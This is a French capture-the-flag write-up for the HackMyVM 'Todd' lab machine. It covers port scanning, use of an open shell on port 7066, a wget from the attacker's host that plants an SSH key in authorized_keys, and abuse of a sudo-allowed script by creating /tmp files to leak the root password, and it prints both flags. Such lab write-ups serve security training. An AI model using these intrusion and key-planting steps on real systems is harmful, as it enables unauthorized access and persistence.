---
title: "Solution du CTF Todd de HackMyVM.eu"
tags: [CTF,HackMyVM]
---

### Mario

Todd de HackMyVM (image OVA zippée [ici](https://downloads.hackmyvm.eu/todd.zip)) était un CTF simple mais un peu fragile.

Il convient de ne pas trop brusquer la VM pour l'avoir en parfait état de fonctionnement.

Au premier scan de ports, j'ai envoyé toute l'artillerie avec détection de version et exécution de scripts NSE. Nmap en a extrait deux ports ouverts.

```console
$ sudo nmap -T5 -p- -oA /tmp/scan -sCV 192.168.56.107
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 192.168.56.107
Host is up (0.000059s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 93:a4:92:55:72:2b:9b:4a:52:66:5c:af:a9:83:3c:fd (RSA)
|   256 1e:a7:44:0b:2c:1b:0d:77:83:df:1d:9f:0e:30:08:4d (ECDSA)
|_  256 d0:fa:9d:76:77:42:6f:91:d3:bd:b5:44:72:a7:c9:71 (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-title: Mindful Listening
|_http-server-header: Apache/2.4.59 (Debian)
MAC Address: 08:00:27:A6:BA:91 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.94 seconds
```

Je me suis donc attardé sur le serveur web et je l'ai énuméré en long et en large à l'aide de `feroxbuster` mais sans succès.

J'ai finalement relancé un scan de port plus basique et il y avait plus de ports.

```
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 93:a4:92:55:72:2b:9b:4a:52:66:5c:af:a9:83:3c:fd (RSA)
|   256 1e:a7:44:0b:2c:1b:0d:77:83:df:1d:9f:0e:30:08:4d (ECDSA)
|_  256 d0:fa:9d:76:77:42:6f:91:d3:bd:b5:44:72:a7:c9:71 (ED25519)
80/tcp    open  http       Apache httpd 2.4.59 ((Debian))
|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: Mindful Listening
1148/tcp  open  tcpwrapped
3302/tcp  open  tcpwrapped
5073/tcp  open  tcpwrapped
6135/tcp  open  tcpwrapped
7066/tcp  open  tcpwrapped
10238/tcp open  tcpwrapped
12967/tcp open  tcpwrapped
21613/tcp open  tcpwrapped
25703/tcp open  tcpwrapped
29939/tcp open  tcpwrapped
31269/tcp open  tcpwrapped
```

J'ai relancé une nouvelle fois :

```
PORT      STATE  SERVICE VERSION
1222/tcp  closed nerv
3944/tcp  closed sops
5973/tcp  closed unknown
7066/tcp  open   unknown
16444/tcp closed overnet
20567/tcp closed unknown
21596/tcp closed unknown
25406/tcp closed unknown
30066/tcp closed unknown
30166/tcp closed unknown
31820/tcp closed unknown
```

Les services semblent quelque peu sporadiques. Finalement sur le port 7066 un shell nous attendait.

Je ne sais pas comment il est lancé, mais ce port a visiblement du mal à se relancer en cas de problèmes. Dès fois une reboot de la VM peut être profitable.

```console
$ ncat 192.168.56.107 7066 -v
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Connected to 192.168.56.107:7066.
id
uid=1000(todd) gid=1000(todd) groups=1000(todd)
pwd
/root
cd /home/todd
pwd
/home/todd
ls
user.txt
ls -al
total 24
drwxr-xr-x 2 todd todd 4096 Mar 22 08:03 .
drwxr-xr-x 3 root root 4096 Mar 22 06:53 ..
lrwxrwxrwx 1 root root    9 Mar 22 08:03 .bash_history -> /dev/null
-rw-r--r-- 1 todd todd  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 todd todd 3526 Apr 18  2019 .bashrc
-rw-r--r-- 1 todd todd  807 Apr 18  2019 .profile
-rw-r--r-- 1 todd todd   39 Mar 22 06:54 user.txt
mkdir .ssh
cd .ssh
wget http://192.168.56.1:8000/hacker.pub -O authorized_keys
exit
```

### Luigi

Une fois placé ma clé SSH parmi les clés autorisées, je peux obtenir un accès via le port SSH.


```console
$ ssh -i ~/.ssh/hacker todd@192.168.56.107
Linux todd 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
$ ls -ald /root
drwx------ 4 root root 4096 Mar 22 11:08 /root
$ cat user.txt
Todd{eb93009a2719640de486c4f68daf62ec}
```

On a l'impression que l'utilisateur courant a été ajouté avec un pied de biche :

```console
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
todd:x:1000:1000:$1$JKwPdlWq$qhzuyUltSCanxyjgrwmUn1:/home/todd:/bin/sh
```

Il est autorisé à exécuter différentes commandes avec les privilèges administrateur dont un script custom :

```console
$ sudo -l
Matching Defaults entries for todd on todd:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User todd may run the following commands on todd:
    (ALL : ALL) NOPASSWD: /bin/bash /srv/guess_and_check.sh
    (ALL : ALL) NOPASSWD: /usr/bin/rm
    (ALL : ALL) NOPASSWD: /usr/sbin/reboot
```

### Todd

Voici le script en question :

```bash
#!/bin/bash

cat << EOF
                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,     HackMyVM
EOF


# check this script used by human 
a=$((RANDOM%1000))
echo "Please Input [$a]"

echo "[+] Check this script used by human."
echo "[+] Please Input Correct Number:"
read -p ">>>" input_number

[[ $input_number -ne "$a" ]] && exit 1

sleep 0.2
true_file="/tmp/$((RANDOM%1000))"
sleep 1
false_file="/tmp/$((RANDOM%1000))"

[[ -f "$true_file" ]] && [[ ! -f "$false_file" ]] && cat /root/.cred || exit 2
```

Ce script assigne un nombre aléatoire à la variable `a` puis nous demande de saisir cette valeur pour vérification.

Ensuite, il prend deux noms de fichiers aléatoires dans `/tmp`, nommés après des nombres entre 0 et 1000.

Si l'un existe mais pas l'autre, alors il affiche le contenu de `/root/cred`

Pour réussir cette vérification, on peut simplement créer 50% des fichiers (de 0 à 500) et relancer autant de fois que nécessaire : 

```console
$ for i in $(seq 1 500); do touch /tmp/$i; done
$ sudo /bin/bash /srv/guess_and_check.sh
                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,     HackMyVM
Please Input [7]
[+] Check this script used by human.
[+] Please Input Correct Number:
>>>7
--- snip ---
$ sudo /bin/bash /srv/guess_and_check.sh
                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,     HackMyVM
Please Input [934]
[+] Check this script used by human.
[+] Please Input Correct Number:
>>>934
fake password
```

Ce `fake password` est bien le mot de passe.

```console
$ su 
Password: 
root@todd:/home/todd# cd
root@todd:~# ls
root.txt
root@todd:~# cat root.txt 
Todd{389c9909b8d6a701217a45104de7aa21}
```


